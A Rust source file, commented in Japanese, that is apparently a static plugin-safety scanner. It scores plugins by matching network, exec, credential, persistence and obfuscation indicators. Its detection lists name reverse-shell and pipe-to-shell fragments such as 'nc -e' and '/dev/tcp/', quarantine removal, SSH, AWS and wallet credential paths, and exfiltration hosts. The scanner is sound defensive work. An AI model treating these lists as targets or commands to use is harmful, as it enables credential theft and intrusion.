//! プラグインの静的な安全性スキャン。
//!
//! 読み込む前に（＝コードを 1 行も実行せずに）ファイルの中身を調べ、外部サーバーとの通信・
//! 個人情報の読み取り・別プログラムの実行・常駐化などの痕跡を探して危険度を付ける。
//! 特に「サーバーを経由する」悪質なプラグイン（情報を外へ送る、外からコードを取ってきて実行する、
//! 外部から命令を受ける）を、通信機能と他の痕跡の組み合わせで見分ける。
//!
//! これは目安であって保証ではない。難読化・暗号化されたコードや、実行時に組み立てる文字列は
//! 見抜けない。逆に正当な用途（ライセンス認証や更新確認）で通信するプラグインも検出される。
//! **導入と使用は利用者の自己責任**で、結果はその判断材料として示すだけ。

use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

/// 画面と CLI に出す、自己責任についての注意書き。
pub const DISCLAIMER: &str = "安全性スキャンは、ファイルを実行せずに中身の文字列を調べる簡易的な検査です。\
悪質なプラグインをすべて見抜けるわけではなく、「安全」と出ても安全を保証するものではありません。\
プラグインの導入・使用は自己責任で行ってください。入手元が信頼できないものは入れないでください。";

/// 1 ファイルあたりに読む上限（これを超える部分は調べない）。
const MAX_BYTES: usize = 256 * 1024 * 1024;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum RiskLevel {
    /// 気になる点が見つからなかった。
    Safe,
    Low,
    Medium,
    High,
    Critical,
}

impl RiskLevel {
    pub fn label(self) -> &'static str {
        match self {
            RiskLevel::Safe => "安全（問題は見つかりませんでした）",
            RiskLevel::Low => "低",
            RiskLevel::Medium => "中",
            RiskLevel::High => "高",
            RiskLevel::Critical => "重大",
        }
    }

    pub fn short(self) -> &'static str {
        match self {
            RiskLevel::Safe => "安全",
            RiskLevel::Low => "低",
            RiskLevel::Medium => "中",
            RiskLevel::High => "高",
            RiskLevel::Critical => "重大",
        }
    }

    /// 読み込みを止め、利用者が自己責任で許可するまで待つ水準か。
    pub fn blocks(self) -> bool {
        self >= RiskLevel::High
    }

    fn from_score(score: u32) -> RiskLevel {
        match score {
            0 => RiskLevel::Safe,
            1..=24 => RiskLevel::Low,
            25..=49 => RiskLevel::Medium,
            50..=79 => RiskLevel::High,
            _ => RiskLevel::Critical,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Category {
    /// 外部と通信する機能。
    Network,
    /// 通信先（URL・IP アドレス）。
    Endpoint,
    /// 別のプログラム・シェルの実行。
    Exec,
    /// 実行時に別のライブラリやコードを読み込む。
    DynamicCode,
    /// パスワード・鍵・ブラウザのデータなど、個人情報の読み取り。
    Sensitive,
    /// 画面・キー入力・クリップボードの監視。
    Surveillance,
    /// ログイン時に自動で起動する仕組みの登録。
    Persistence,
    /// 解析・デバッグの妨害。
    AntiAnalysis,
    /// 難読化（中身を隠している）。
    Obfuscation,
    /// 宣言されていない実行ファイル・スクリプト。
    Payload,
    /// マニフェストの宣言と中身の食い違い。
    Undeclared,
    /// 複数の痕跡の組み合わせから推定される振る舞い。
    Behavior,
}

impl Category {
    pub fn label(self) -> &'static str {
        match self {
            Category::Network => "通信",
            Category::Endpoint => "通信先",
            Category::Exec => "プログラムの実行",
            Category::DynamicCode => "コードの追加読み込み",
            Category::Sensitive => "個人情報",
            Category::Surveillance => "監視",
            Category::Persistence => "常駐化",
            Category::AntiAnalysis => "解析妨害",
            Category::Obfuscation => "難読化",
            Category::Payload => "同梱物",
            Category::Undeclared => "未宣言",
            Category::Behavior => "推定される振る舞い",
        }
    }
}

#[derive(Debug, Clone, PartialEq)]
pub struct Finding {
    pub category: Category,
    /// この項目の重み（合計で危険度が決まる）。
    pub score: u32,
    pub title: String,
    /// 見つかった文字列など（最大数件）。
    pub evidence: Vec<String>,
    pub file: PathBuf,
}

#[derive(Debug, Clone, PartialEq)]
pub struct SecurityReport {
    pub path: PathBuf,
    pub level: RiskLevel,
    pub score: u32,
    pub findings: Vec<Finding>,
    /// 中身の SHA-256（16 進）。許可の記録に使う。フォルダは全ファイルをまとめたもの。
    pub hash: String,
    pub files_scanned: usize,
    /// 見つかった通信先（重複なし）。
    pub endpoints: Vec<String>,
}

impl SecurityReport {
    pub fn summary(&self) -> String {
        if self.findings.is_empty() {
            return format!("危険度: {}", self.level.label());
        }
        let cats: BTreeSet<&str> = self.findings.iter().map(|f| f.category.label()).collect();
        format!("危険度: {}（{}点 / {}）", self.level.label(), self.score, cats.into_iter().collect::<Vec<_>>().join("・"))
    }

    pub fn has(&self, c: Category) -> bool {
        self.findings.iter().any(|f| f.category == c)
    }
}

/// マニフェストで宣言された権限（`plugin.json` の `permissions`）。
#[derive(Debug, Clone, Default, PartialEq)]
pub struct Declared {
    /// マニフェストのあるパッケージか（単体のライブラリは false）。
    pub manifest: bool,
    pub permissions: BTreeSet<String>,
    /// 実行してよいと宣言されたファイル（エフェクトのライブラリ）。
    pub binaries: BTreeSet<PathBuf>,
}

// ---------------------------------------------------------------------------
// 見る項目
// ---------------------------------------------------------------------------

/// 通信の API（関数名・クラス名・フレームワーク名）。トークン単位で完全一致させる。
const NET_SYMBOLS: &[&str] = &[
    "socket",
    "connect",
    "getaddrinfo",
    "gethostbyname",
    "gethostbyname2",
    "sendto",
    "recvfrom",
    "inet_pton",
    "inet_addr",
    "curl_easy_init",
    "curl_easy_perform",
    "curl_easy_setopt",
    "SSL_connect",
    "SSL_write",
    "NSURLSession",
    "NSURLConnection",
    "NSURLRequest",
    "NSMutableURLRequest",
    "CFHTTPMessageCreateRequest",
    "CFReadStreamCreateForHTTPRequest",
    "CFStreamCreatePairWithSocketToHost",
    "CFSocketCreate",
    "nw_connection_create",
    "nw_connection_start",
    "WSAStartup",
    "WSASocketW",
    "InternetOpenA",
    "InternetOpenW",
    "InternetOpenUrlA",
    "InternetOpenUrlW",
    "HttpSendRequestA",
    "HttpSendRequestW",
    "WinHttpOpen",
    "WinHttpSendRequest",
    "URLDownloadToFileA",
    "URLDownloadToFileW",
    "URLOpenStreamA",
];
const NET_LIBS: &[&str] = &[
    "libcurl",
    "CFNetwork.framework",
    "Network.framework",
    "ws2_32.dll",
    "WS2_32.dll",
    "wininet.dll",
    "WININET.dll",
    "winhttp.dll",
    "WINHTTP.dll",
    "urlmon.dll",
    "libssl",
];
const EXEC_SYMBOLS: &[&str] = &[
    "system",
    "popen",
    "execve",
    "execv",
    "execvp",
    "execl",
    "execlp",
    "posix_spawn",
    "posix_spawnp",
    "NSTask",
    "NSAppleScript",
    "CreateProcessA",
    "CreateProcessW",
    "ShellExecuteA",
    "ShellExecuteW",
    "ShellExecuteExW",
    "WinExec",
];
const DYN_SYMBOLS: &[&str] = &["dlopen", "LoadLibraryA", "LoadLibraryW", "LoadLibraryExW", "NSCreateObjectFileImageFromMemory", "mprotect", "VirtualProtect"];
const SENSITIVE_SYMBOLS: &[&str] =
    &["SecKeychainFindGenericPassword", "SecKeychainFindInternetPassword", "SecItemCopyMatching", "CryptUnprotectData", "CredEnumerateW"];
const SURVEILLANCE_SYMBOLS: &[&str] = &[
    "CGEventTapCreate",
    "CGWindowListCreateImage",
    "CGDisplayCreateImage",
    "SetWindowsHookExA",
    "SetWindowsHookExW",
    "GetAsyncKeyState",
    "NSPasteboard",
    "GetClipboardData",
    "AVCaptureDevice",
];
const ANTI_SYMBOLS: &[&str] = &["ptrace", "IsDebuggerPresent", "CheckRemoteDebuggerPresent"];

/// 部分一致で探す文字列（小文字で比較）。
const SENSITIVE_STRINGS: &[&str] = &[
    "/.ssh/",
    "id_rsa",
    "id_ed25519",
    "/.aws/credentials",
    "/.gnupg",
    "login data",
    "cookies.sqlite",
    "/cookies",
    "keychain-db",
    "login.keychain",
    "google/chrome/default",
    "firefox/profiles",
    "wallet.dat",
    "/exodus/",
    "metamask",
    "telegram desktop",
    "discord/local storage",
    "aws_secret_access_key",
    "github_token",
];
const PERSIST_STRINGS: &[&str] = &[
    "library/launchagents",
    "library/launchdaemons",
    "crontab",
    "currentversion\\run",
    "/.bash_profile",
    "/.bashrc",
    "/.zshrc",
    "/.profile",
    "loginitems",
    "systemd/user",
    "/etc/rc.local",
];
const SHELL_STRINGS: &[&str] = &[
    "/bin/sh",
    "/bin/bash",
    "/bin/zsh",
    "curl -",
    "curl http",
    "wget ",
    "chmod +x",
    "chmod 777",
    "osascript",
    "powershell",
    "cmd.exe /c",
    "base64 -d",
    "base64 --decode",
    "| sh",
    "|sh",
    "nc -e",
    "/dev/tcp/",
    "xattr -d com.apple.quarantine",
];
/// `needle` を含むか。末尾が英字の語（`| sh` など）は、直後に英数字が続くもの（`|shift`）を数えない。
fn contains_word_end(hay: &str, needle: &str) -> bool {
    if !needle.ends_with(|c: char| c.is_ascii_alphabetic()) {
        return hay.contains(needle);
    }
    let mut from = 0;
    while let Some(i) = hay[from..].find(needle) {
        let end = from + i + needle.len();
        if !hay[end..].starts_with(|c: char| c.is_ascii_alphanumeric() || c == '_') {
            return true;
        }
        from = from + i + 1;
        while !hay.is_char_boundary(from) {
            from += 1;
        }
    }
    false
}

/// 文書・名前空間などで普通に現れる URL のホスト。通信先として数えない。
const BENIGN_HOSTS: &[&str] = &[
    "www.apple.com",
    "apple.com",
    "www.w3.org",
    "w3.org",
    "openfx.org",
    "www.openfx.org",
    "openeffects.org",
    "www.gnu.org",
    "gnu.org",
    "opensource.org",
    "www.opensource.org",
    "creativecommons.org",
    "www.apache.org",
    "apache.org",
    "spdx.org",
    "www.boost.org",
    "schemas.microsoft.com",
    "schemas.openxmlformats.org",
    "ns.adobe.com",
    "purl.org",
    "xml.org",
    "www.unicode.org",
    "unicode.org",
    "localhost",
    "127.0.0.1",
    "example.com",
    "www.example.com",
];
/// 悪用されやすい通信先（使い捨てのファイル置き場・チャットの Webhook・トンネル・短縮 URL など）。
const SUSPICIOUS_HOSTS: &[&str] = &[
    "pastebin.com",
    "paste.ee",
    "hastebin",
    "ghostbin",
    "rentry.co",
    "transfer.sh",
    "file.io",
    "anonfiles",
    "gofile.io",
    "mega.nz",
    "discord.com/api/webhooks",
    "discordapp.com/api/webhooks",
    "api.telegram.org",
    "ngrok",
    "trycloudflare.com",
    "serveo.net",
    "duckdns.org",
    "no-ip",
    "ddns.net",
    "bit.ly",
    "tinyurl.com",
    "is.gd",
    "t.co/",
    "raw.githubusercontent.com",
    "gist.githubusercontent.com",
    "workers.dev",
    "requestbin",
    "webhook.site",
    "pipedream.net",
    "interact.sh",
    "burpcollaborator",
    ".onion",
    ".ru/",
    ".top/",
    ".xyz/",
];
/// スクリプトの中の、通信しようとする書き方。
const SCRIPT_NET: &[&str] =
    &["fetch(", "xmlhttprequest", "websocket(", "new websocket", "navigator.sendbeacon", "eventsource(", "require('http", "require(\"http", "import("];
const SCRIPT_EXEC: &[&str] = &[
    "require('child_process",
    "require(\"child_process",
    "child_process",
    "os.system(",
    "subprocess.",
    "process.binding",
    "std.popen",
    "os.exec",
];
const SCRIPT_DYN: &[&str] = &["eval(", "new function(", "function(\"", "settimeout(\"", "settimeout('"];

// ---------------------------------------------------------------------------
// スキャン本体
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum FileKind {
    Binary,
    Script,
    /// マニフェスト・画像・文書など。URL だけ見る。
    Data,
}

fn classify(path: &Path, head: &[u8]) -> FileKind {
    let magic = head.get(..4).unwrap_or(&[]);
    let is_macho = matches!(
        magic,
        [0xfe, 0xed, 0xfa, 0xce] | [0xfe, 0xed, 0xfa, 0xcf] | [0xce, 0xfa, 0xed, 0xfe] | [0xcf, 0xfa, 0xed, 0xfe] | [0xca, 0xfe, 0xba, 0xbe]
    );
    if is_macho || magic == b"\x7fELF" || head.starts_with(b"MZ") {
        return FileKind::Binary;
    }
    let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("").to_ascii_lowercase();
    if head.starts_with(b"#!")
        || matches!(ext.as_str(), "js" | "mjs" | "sh" | "bash" | "zsh" | "command" | "py" | "rb" | "pl" | "ps1" | "bat" | "cmd" | "vbs" | "applescript" | "scpt" | "lua")
    {
        return FileKind::Script;
    }
    FileKind::Data
}

/// 印字可能な ASCII の並び（4 文字以上）を取り出す。バイナリの中の文字列表・シンボル名を拾う。
fn strings(bytes: &[u8]) -> Vec<&str> {
    let mut out = Vec::new();
    let mut start = None;
    for (i, &b) in bytes.iter().enumerate() {
        let printable = (0x20..0x7f).contains(&b) || b == b'\t';
        match (printable, start) {
            (true, None) => start = Some(i),
            (false, Some(s)) => {
                if i - s >= 4 {
                    // SAFETY 不要: ASCII のみなので UTF-8 として正しい
                    out.push(std::str::from_utf8(&bytes[s..i]).unwrap_or(""));
                }
                start = None;
            }
            _ => {}
        }
    }
    if let Some(s) = start {
        if bytes.len() - s >= 4 {
            out.push(std::str::from_utf8(&bytes[s..]).unwrap_or(""));
        }
    }
    out
}

/// シンボル名として比べられる形にする（Mach-O の先頭の `_`、ELF の `@GLIBC_...`、Objective-C の `_OBJC_CLASS_$_` を落とす）。
fn symbol_token(s: &str) -> &str {
    let s = s.split('@').next().unwrap_or(s);
    let s = s.strip_prefix("_OBJC_CLASS_$_").unwrap_or(s);
    let s = s.strip_prefix("OBJC_CLASS_$_").unwrap_or(s);
    let s = s.trim_start_matches('_');
    s.strip_suffix("$UNIX2003").unwrap_or(s)
}

struct Hits {
    found: BTreeSet<String>,
}

impl Hits {
    fn new() -> Self {
        Hits { found: BTreeSet::new() }
    }
    fn push(&mut self, s: &str) {
        if self.found.len() < 8 {
            self.found.insert(s.to_string());
        }
    }
    fn any(&self) -> bool {
        !self.found.is_empty()
    }
    fn list(&self) -> Vec<String> {
        self.found.iter().cloned().collect()
    }
}

/// URL・IP アドレスを取り出す。
fn endpoints(text: &str, out: &mut BTreeSet<String>) {
    let lower = text.to_ascii_lowercase();
    for scheme in ["https://", "http://", "wss://", "ws://", "ftp://", "tcp://", "udp://"] {
        let mut from = 0;
        while let Some(p) = lower[from..].find(scheme) {
            let s = from + p;
            let end = lower[s..]
                .find(|c: char| c.is_whitespace() || matches!(c, '"' | '\'' | '<' | '>' | '`' | ')' | '\0'))
                .map(|e| s + e)
                .unwrap_or(lower.len());
            let url = &text[s..end];
            if url.len() > scheme.len() + 3 && out.len() < 64 {
                out.insert(url.trim_end_matches(['.', ',', ';']).to_string());
            }
            from = end.max(s + scheme.len());
        }
    }
    // URL になっていない生の IPv4 アドレス（ポート付きを含む）
    for token in text.split(|c: char| !(c.is_ascii_digit() || c == '.' || c == ':')) {
        let host = token.split(':').next().unwrap_or("");
        let parts: Vec<&str> = host.split('.').collect();
        if parts.len() != 4 || !parts.iter().all(|p| !p.is_empty() && p.len() <= 3 && p.parse::<u16>().is_ok_and(|v| v <= 255)) {
            continue;
        }
        let first: u16 = parts[0].parse().unwrap_or(0);
        // バージョン番号（1.2.3.4）と区別するため、ループバック・未指定・小さすぎる値は除く
        if first == 0 || first == 127 || first >= 224 || parts.iter().all(|p| p.parse::<u16>().unwrap_or(0) < 10) {
            continue;
        }
        if out.len() < 64 {
            out.insert(token.trim_end_matches(':').to_string());
        }
    }
}

fn host_of(url: &str) -> String {
    let rest = url.split("://").nth(1).unwrap_or(url);
    let host = rest.split(['/', '?', '#']).next().unwrap_or(rest);
    let host = host.rsplit('@').next().unwrap_or(host);
    host.split(':').next().unwrap_or(host).to_ascii_lowercase()
}

fn is_ip(host: &str) -> bool {
    let parts: Vec<&str> = host.split('.').collect();
    parts.len() == 4 && parts.iter().all(|p| p.parse::<u8>().is_ok())
}

/// 長い base64 / 16 進の塊（中身を隠しているかもしれない）。
fn encoded_blobs(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    for token in text.split(|c: char| !(c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '='))) {
        if token.len() >= 400 {
            let has_mix = token.chars().any(|c| c.is_ascii_uppercase())
                && token.chars().any(|c| c.is_ascii_lowercase())
                && token.chars().any(|c| c.is_ascii_digit());
            let hex = token.chars().all(|c| c.is_ascii_hexdigit());
            if has_mix || hex {
                out.push(format!("{}…（{} 文字）", &token[..32], token.len()));
                if out.len() >= 3 {
                    break;
                }
            }
        }
    }
    out
}

struct FileScan {
    findings: Vec<Finding>,
    endpoints: BTreeSet<String>,
    network: bool,
    exec: bool,
    dynamic: bool,
    sensitive: bool,
    surveillance: bool,
    persistence: bool,
    /// 悪用されやすい通信先が書かれている。
    suspicious_host: bool,
    kind: FileKind,
}

fn finding(category: Category, score: u32, title: impl Into<String>, evidence: Vec<String>, file: &Path) -> Finding {
    Finding { category, score, title: title.into(), evidence, file: file.to_path_buf() }
}

fn scan_bytes(path: &Path, bytes: &[u8], declared: &Declared) -> FileScan {
    let kind = classify(path, bytes);
    let mut fs = FileScan {
        findings: Vec::new(),
        endpoints: BTreeSet::new(),
        network: false,
        exec: false,
        dynamic: false,
        sensitive: false,
        surveillance: false,
        persistence: false,
        suspicious_host: false,
        kind,
    };
    let text_owned;
    let strs: Vec<&str> = if kind == FileKind::Binary {
        strings(bytes)
    } else {
        text_owned = String::from_utf8_lossy(bytes).into_owned();
        vec![text_owned.as_str()]
    };

    let (mut net, mut exec, mut dynamic, mut sens, mut surv, mut persist, mut anti, mut shell) =
        (Hits::new(), Hits::new(), Hits::new(), Hits::new(), Hits::new(), Hits::new(), Hits::new(), Hits::new());
    let mut deny_attach = false;
    for s in &strs {
        if kind == FileKind::Binary {
            let tok = symbol_token(s);
            let check = |list: &[&str], hits: &mut Hits| {
                if let Some(m) = list.iter().find(|m| **m == tok) {
                    hits.push(m);
                }
            };
            check(NET_SYMBOLS, &mut net);
            check(EXEC_SYMBOLS, &mut exec);
            check(DYN_SYMBOLS, &mut dynamic);
            check(SENSITIVE_SYMBOLS, &mut sens);
            check(SURVEILLANCE_SYMBOLS, &mut surv);
            check(ANTI_SYMBOLS, &mut anti);
            if let Some(m) = NET_LIBS.iter().find(|m| s.contains(**m)) {
                net.push(m);
            }
            if s.contains("PT_DENY_ATTACH") || s.contains("P_TRACED") {
                deny_attach = true;
            }
        }
        let lower = s.to_ascii_lowercase();
        for (list, hits) in
            [(SENSITIVE_STRINGS, &mut sens), (PERSIST_STRINGS, &mut persist), (SHELL_STRINGS, &mut shell)]
        {
            if let Some(m) = list.iter().find(|m| contains_word_end(&lower, m)) {
                hits.push(m);
            }
        }
        if kind == FileKind::Script {
            for (list, hits) in [(SCRIPT_NET, &mut net), (SCRIPT_EXEC, &mut exec), (SCRIPT_DYN, &mut dynamic)] {
                for m in list.iter().filter(|m| lower.contains(**m)) {
                    hits.push(m);
                }
            }
        }
        endpoints(s, &mut fs.endpoints);
    }

    // 文書でよく見る URL は通信先として数えない
    fs.endpoints.retain(|u| {
        let host = host_of(u);
        !BENIGN_HOSTS.iter().any(|b| host == *b)
    });

    let script = kind == FileKind::Script;
    let script_note = if script && path.extension().is_some_and(|e| e == "js") {
        "（znd のスクリプト環境には通信・実行の手段が無いので、そのままでは動きませんが、意図として記録します）"
    } else {
        ""
    };
    if net.any() {
        fs.network = true;
        let title = if kind == FileKind::Binary {
            "外部のサーバーと通信する機能を持っています".to_string()
        } else {
            format!("外部と通信しようとする記述があります{script_note}")
        };
        fs.findings.push(finding(Category::Network, 30, title, net.list(), path));
    }
    if exec.any() || shell.any() {
        fs.exec = true;
        let mut ev = exec.list();
        ev.extend(shell.list());
        fs.findings.push(finding(Category::Exec, 25, format!("別のプログラムやシェルコマンドを実行できます{script_note}"), ev, path));
    }
    if dynamic.any() {
        fs.dynamic = true;
        let title = if script { "文字列をコードとして実行する記述があります（eval など）" } else { "実行時に別のコードを読み込めます" };
        fs.findings.push(finding(Category::DynamicCode, 10, title, dynamic.list(), path));
    }
    if sens.any() {
        fs.sensitive = true;
        fs.findings.push(finding(Category::Sensitive, 30, "パスワード・鍵・ブラウザのデータなどの場所や読み取り機能を参照しています", sens.list(), path));
    }
    if surv.any() {
        fs.surveillance = true;
        fs.findings.push(finding(Category::Surveillance, 20, "画面・キー入力・クリップボード・カメラを読み取れます", surv.list(), path));
    }
    if persist.any() {
        fs.persistence = true;
        fs.findings.push(finding(Category::Persistence, 35, "ログイン時の自動起動や設定ファイルの書き換えに関わる場所を参照しています", persist.list(), path));
    }
    if anti.any() && (deny_attach || anti.found.iter().any(|s| s != "ptrace")) {
        fs.findings.push(finding(Category::AntiAnalysis, 20, "デバッガーによる解析を妨げる処理があります", anti.list(), path));
    }

    // 通信先
    if !fs.endpoints.is_empty() {
        let mut suspicious = Vec::new();
        let mut plain = Vec::new();
        let mut raw_ip = Vec::new();
        for u in &fs.endpoints {
            let lower = u.to_ascii_lowercase();
            let host = host_of(u);
            if SUSPICIOUS_HOSTS.iter().any(|s| lower.contains(s)) {
                suspicious.push(u.clone());
            } else if is_ip(&host) || (!u.contains("://") && is_ip(u.split(':').next().unwrap_or(""))) {
                raw_ip.push(u.clone());
            } else if lower.starts_with("http://") || lower.starts_with("ws://") || lower.starts_with("ftp://") {
                plain.push(u.clone());
            }
        }
        if !suspicious.is_empty() {
            fs.suspicious_host = true;
            fs.findings.push(finding(
                Category::Endpoint,
                35,
                "悪用されやすい通信先（使い捨てのファイル置き場・チャットの Webhook・トンネル・短縮 URL など）が書かれています",
                suspicious.into_iter().take(6).collect(),
                path,
            ));
        }
        if !raw_ip.is_empty() {
            fs.findings.push(finding(
                Category::Endpoint,
                if fs.network { 25 } else { 10 },
                "ドメイン名ではなく IP アドレスが直接書かれています",
                raw_ip.into_iter().take(6).collect(),
                path,
            ));
        }
        if !plain.is_empty() {
            fs.findings.push(finding(Category::Endpoint, 8, "暗号化されていない通信先（http:// など）が書かれています", plain.into_iter().take(6).collect(), path));
        }
        if fs.findings.iter().all(|f| f.category != Category::Endpoint) {
            fs.findings.push(finding(
                Category::Endpoint,
                if fs.network { 5 } else { 2 },
                "URL が書かれています（通信先の可能性）",
                fs.endpoints.iter().take(6).cloned().collect(),
                path,
            ));
        }
    }

    // 難読化
    if kind != FileKind::Binary {
        let text = strs.first().copied().unwrap_or("");
        let blobs = encoded_blobs(text);
        if !blobs.is_empty() {
            fs.findings.push(finding(Category::Obfuscation, 15, "長い符号化データ（base64 / 16 進）が埋め込まれています", blobs, path));
        }
        if script {
            let escapes = text.matches("\\x").count() + text.matches("\\u00").count();
            let long_line = text.lines().any(|l| l.len() > 4000);
            let decode = ["atob(", "fromcharcode", "unescape("].iter().filter(|m| text.to_ascii_lowercase().contains(**m)).count();
            if escapes > 64 || long_line || decode >= 2 {
                let mut ev = Vec::new();
                if escapes > 64 {
                    ev.push(format!("\\x / \\u エスケープ {escapes} 個"));
                }
                if long_line {
                    ev.push("4000 文字を超える行".into());
                }
                if decode >= 2 {
                    ev.push("atob / fromCharCode / unescape".into());
                }
                fs.findings.push(finding(Category::Obfuscation, 20, "中身を読みにくくする書き方（難読化）が見られます", ev, path));
            }
        }
    }

    // マニフェストにない実行ファイル・スクリプト
    if declared.manifest {
        let undeclared_binary = kind == FileKind::Binary && !declared.binaries.iter().any(|b| path.starts_with(b) || b == path);
        let foreign_script = script && !path.extension().is_some_and(|e| e == "js");
        if undeclared_binary || foreign_script {
            fs.findings.push(finding(
                Category::Payload,
                25,
                if undeclared_binary {
                    "マニフェストで宣言されていない実行ファイルが同梱されています"
                } else {
                    "znd では使わない種類のスクリプト（シェル・Python など）が同梱されています"
                },
                vec![path.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default()],
                path,
            ));
        }
    }
    fs
}

/// プラグインファイル（ライブラリ・バンドル・パッケージのフォルダ）を調べる。
pub fn scan_path(path: &Path, declared: &Declared) -> SecurityReport {
    let mut files = Vec::new();
    collect_files(path, &mut files, 0);
    files.sort();
    let mut hasher = Sha256::new();
    let mut all = Vec::new();
    let mut endpoints = BTreeSet::new();
    let (mut network, mut exec, mut dynamic, mut sensitive, mut surveillance, mut persistence) = (false, false, false, false, false, false);
    let mut binary_network = false;
    let mut suspicious_host = false;
    for file in &files {
        let Ok(mut bytes) = std::fs::read(file) else { continue };
        bytes.truncate(MAX_BYTES);
        let rel = file.strip_prefix(path).unwrap_or(file);
        hasher.update(rel.to_string_lossy().as_bytes());
        hasher.update(&[0]);
        hasher.update(&bytes);
        let fs = scan_bytes(file, &bytes, declared);
        network |= fs.network;
        binary_network |= fs.network && fs.kind == FileKind::Binary;
        exec |= fs.exec;
        dynamic |= fs.dynamic;
        sensitive |= fs.sensitive;
        surveillance |= fs.surveillance;
        persistence |= fs.persistence;
        suspicious_host |= fs.suspicious_host;
        endpoints.extend(fs.endpoints);
        all.extend(fs.findings);
    }

    // 組み合わせから推定される振る舞い（サーバーを経由する悪質なもの）
    if network && (sensitive || surveillance) {
        all.push(finding(
            Category::Behavior,
            45,
            "情報の持ち出しの疑い: 個人情報・画面・入力を読み取る痕跡と、外部と通信する機能の両方があります",
            Vec::new(),
            path,
        ));
    }
    if network && (exec || dynamic) && binary_network {
        all.push(finding(
            Category::Behavior,
            35,
            "外部からのプログラム取得・実行の疑い: 通信する機能と、別のコード・プログラムを実行する機能の両方があります",
            Vec::new(),
            path,
        ));
    }
    if network && persistence {
        all.push(finding(
            Category::Behavior,
            40,
            "遠隔操作の疑い: 通信する機能と、自動起動を仕込む痕跡の両方があります",
            Vec::new(),
            path,
        ));
    }
    if network && suspicious_host {
        all.push(finding(Category::Behavior, 30, "悪用されやすい通信先と、実際に通信する機能の両方があります", Vec::new(), path));
    }
    // 宣言との食い違い
    if network {
        if !declared.manifest {
            all.push(finding(
                Category::Undeclared,
                10,
                "通信することがどこにも宣言されていません（エフェクトだけのプラグインは本来通信を必要としません）",
                Vec::new(),
                path,
            ));
        } else if !declared.permissions.contains("network") {
            all.push(finding(
                Category::Undeclared,
                25,
                "マニフェストの permissions に \"network\" が無いのに、通信する痕跡があります",
                Vec::new(),
                path,
            ));
        }
    }
    if exec && declared.manifest && !declared.permissions.contains("process") {
        all.push(finding(
            Category::Undeclared,
            15,
            "マニフェストの permissions に \"process\" が無いのに、プログラムを実行する痕跡があります",
            Vec::new(),
            path,
        ));
    }

    all.sort_by(|a, b| b.score.cmp(&a.score).then(a.category.cmp(&b.category)));
    let score: u32 = all.iter().map(|f| f.score).sum();
    let mut level = RiskLevel::from_score(score);
    // 持ち出し・遠隔操作の疑いは点数に関係なく重大とする
    if all.iter().any(|f| f.category == Category::Behavior && f.score >= 40) {
        level = RiskLevel::Critical;
    }
    SecurityReport {
        path: path.to_path_buf(),
        level,
        score,
        findings: all,
        hash: hasher.finish_hex(),
        files_scanned: files.len(),
        endpoints: endpoints.into_iter().collect(),
    }
}

fn collect_files(path: &Path, out: &mut Vec<PathBuf>, depth: usize) {
    if out.len() > 4096 || depth > 12 {
        return;
    }
    // シンボリックリンクはたどらない（外のファイルを巻き込まない）
    let Ok(meta) = std::fs::symlink_metadata(path) else { return };
    if meta.is_file() {
        out.push(path.to_path_buf());
    } else if meta.is_dir() {
        let Ok(entries) = std::fs::read_dir(path) else { return };
        for e in entries.flatten() {
            collect_files(&e.path(), out, depth + 1);
        }
    }
}

// ---------------------------------------------------------------------------
// SHA-256（許可の記録に使う。外部の依存を増やさないため自前で持つ）
// ---------------------------------------------------------------------------

pub(crate) struct Sha256 {
    h: [u32; 8],
    buf: Vec<u8>,
    len: u64,
}

const K: [u32; 64] = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be,
    0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa,
    0x5cb0a9dc, 0x76f988da, 0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967, 0x27b70a85,
    0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
    0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070, 0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f,
    0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
];

impl Sha256 {
    pub(crate) fn new() -> Self {
        Sha256 {
            h: [0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19],
            buf: Vec::with_capacity(64),
            len: 0,
        }
    }

    pub(crate) fn update(&mut self, mut data: &[u8]) {
        self.len += data.len() as u64;
        if !self.buf.is_empty() {
            let take = (64 - self.buf.len()).min(data.len());
            self.buf.extend_from_slice(&data[..take]);
            data = &data[take..];
            if self.buf.len() == 64 {
                let block: [u8; 64] = self.buf[..].try_into().unwrap();
                self.block(&block);
                self.buf.clear();
            }
        }
        let mut chunks = data.chunks_exact(64);
        for c in &mut chunks {
            self.block(c.try_into().unwrap());
        }
        self.buf.extend_from_slice(chunks.remainder());
    }

    fn block(&mut self, b: &[u8; 64]) {
        let mut w = [0u32; 64];
        for i in 0..16 {
            w[i] = u32::from_be_bytes([b[4 * i], b[4 * i + 1], b[4 * i + 2], b[4 * i + 3]]);
        }
        for i in 16..64 {
            let s0 = w[i - 15].rotate_right(7) ^ w[i - 15].rotate_right(18) ^ (w[i - 15] >> 3);
            let s1 = w[i - 2].rotate_right(17) ^ w[i - 2].rotate_right(19) ^ (w[i - 2] >> 10);
